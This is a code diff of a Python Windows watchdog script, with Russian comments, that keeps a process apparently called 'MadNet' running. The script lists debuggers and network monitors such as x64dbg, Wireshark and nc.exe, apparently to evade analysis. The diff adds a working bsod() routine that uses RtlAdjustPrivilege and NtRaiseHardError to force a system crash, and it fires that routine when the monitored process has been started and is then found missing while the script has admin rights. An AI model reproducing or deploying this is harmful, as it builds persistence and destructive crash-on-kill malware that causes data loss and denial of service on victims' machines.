@@ -22,7 +22,28 @@ debuggers = ['OllyDbg.exe', 'WinDbg.exe', 'devenv.exe', 'gdb.exe', 'x64dbg.exe',
              'processhacker.exe', 'wireshark.exe', 'nc.exe', 'telnet.exe', 'netmon.exe', 'tcpdump.exe']
 
 
+def bsod():
+    nullptr = ctypes.POINTER(ctypes.c_int)()
+
+    ctypes.windll.ntdll.RtlAdjustPrivilege(
+        ctypes.c_uint(19),
+        ctypes.c_uint(1),
+        ctypes.c_uint(0),
+        ctypes.byref(ctypes.c_int())
+    )
+
+    ctypes.windll.ntdll.NtRaiseHardError(
+        ctypes.c_ulong(0xC000007B),
+        ctypes.c_ulong(0),
+        nullptr,
+        nullptr,
+        ctypes.c_uint(6),
+        ctypes.byref(ctypes.c_uint())
+    )
+
+
 async def check_and_restart_process():
+    start = False
     while True:
         # проверяем, работает ли процесс
         result = subprocess.run(["tasklist"], stdout=subprocess.PIPE)
@@ -30,13 +51,19 @@ async def check_and_restart_process():
         if process_name not in output:
             # если процесс не работает, то пытаемся его перезапустить
             try:
-                # проверяем, запущен ли скрипт от имени администратора
-                if ctypes.windll.shell32.IsUserAnAdmin():
-                    # если запущен, то перезапускаем процесс от имени администратора
-                    subprocess.run(["start", "cmd", "/c", "runas", process_file_path])
+                if start and is_admin():
+                    # Вызываем BSOD, если есть права администратора и MadNet нет в списке процессов
+                    bsod()
                 else:
-                    # если не запущен, то перезапускаем процесс обычным способом
-                    subprocess.run([process_file_path])
+                    # проверяем, запущен ли скрипт от имени администратора
+                    if is_admin():
+                        # если запущен, то перезапускаем процесс от имени администратора
+                        subprocess.run(["start", "cmd", "/c", "runas", process_file_path])
+                        start = True
+                    else:
+                        # если не запущен, то перезапускаем процесс обычным способом
+                        subprocess.run([process_file_path])
+                        start = True
             except:
                 return False
         else:
